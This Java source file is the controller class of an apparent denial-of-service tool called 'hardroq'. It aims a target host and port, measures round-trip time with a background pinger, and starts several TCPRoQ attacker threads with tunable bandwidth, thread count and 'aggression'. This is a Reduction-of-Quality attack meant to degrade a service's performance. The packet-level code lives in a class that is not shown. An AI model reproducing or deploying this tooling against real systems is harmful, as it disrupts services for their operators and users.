package hardroq.controllers;

import hardroq.networking.Ping;
import hardroq.networking.TCPRoQ;

import java.io.IOException;

public class AttackController {
	//Singleton Crap
	private static AttackController _instance = new AttackController();
	private AttackController() {}
	
	public static AttackController getInstance() {
		return _instance;
	}
	
	//Internals
	private TCPRoQ[] attackers;
	private String host;
	private int port;
	private int RTT = 0;
	private int startingRTT = 0;
	private String attackHeader = "";
	private String attackFooter = "";
	private float aggressionIndex;
	private float bandwidth;
	private int numThreads;
	private Thread pingThread = new Thread();
	private boolean attacking = false;
	
	public void Attack() {
		//First, let's start the RTT Pinger to initialize the attack vectors
		attacking  = true;
		startPinging();
		
		while (RTT == 0)
			try {
				Thread.sleep(10);
			} catch (InterruptedException e) {
				System.out.println(e.getMessage());
			}
		
		startingRTT = RTT;	
		
		attackers = new TCPRoQ[numThreads];
		for (int i = numThreads; --i >= 0;) {
			final TCPRoQ a = new TCPRoQ.Builder().host(host).port(port)
					.bandwidth(bandwidth / numThreads).header(attackHeader)
					.footer(attackFooter).aggression(aggressionIndex)
					.RTT(RTT).build();
			a.InitiateAttack();
			attackers[i] = a;
		}		
	}
	
	public void EndAttack() {
		if (attacking) {
			for (TCPRoQ a : attackers)
				a.EndAttack();
		
			attacking = false;
		}
	}

	private void startPinging() {
		if (!pingThread.isAlive()) {
			pingThread = new Thread(pinger, "Ping Thread");
			pingThread.start();
		}
	}

	private Runnable pinger = new Runnable() {
		@Override
		public void run() {
			while (attacking) {
				try {
					RTT = Ping.HTTPPing(host, port);
					Thread.sleep(2000);
				} catch (Exception e) {
					System.out.println(e.getMessage());
				}
				
				TCPRoQ.setRTT(RTT);
			}
		}
	};
	
	public long getPacketCount() {
		long sum = 0;
		if (attackers != null && attackers.length > 0)
			for (TCPRoQ a : attackers)
				sum += a.getPacketsSent();
		
		return sum;
	}
	
	public int getCurrentRTT() {
		return RTT;
	}
	
	public void setAttackHeader(final String h) {
		attackHeader = h;
	}
	
	public void setAttackFooter(final String f) {
		attackFooter = f;
	}
	
	public void setAggressionIndex(final int a) {
		final float ai = a / 100.0f;
		aggressionIndex = ai;
	}
	
	public void setBandwidth(final float b) {
		bandwidth = b;
	}
	
	public void setTarget(final String t) {
		//if this is some sort of protocol, we should parse it
		host = t;
	}
	
	public void setPort(final int p) {
		port = p;
	}
	
	public void setNumThreads(final int t) {
		numThreads = t;
	}

	public float getDeltaRTT() {
		return (float) RTT / (float) startingRTT;
	}

	public boolean isAttacking() {
		return attacking;
	}
}
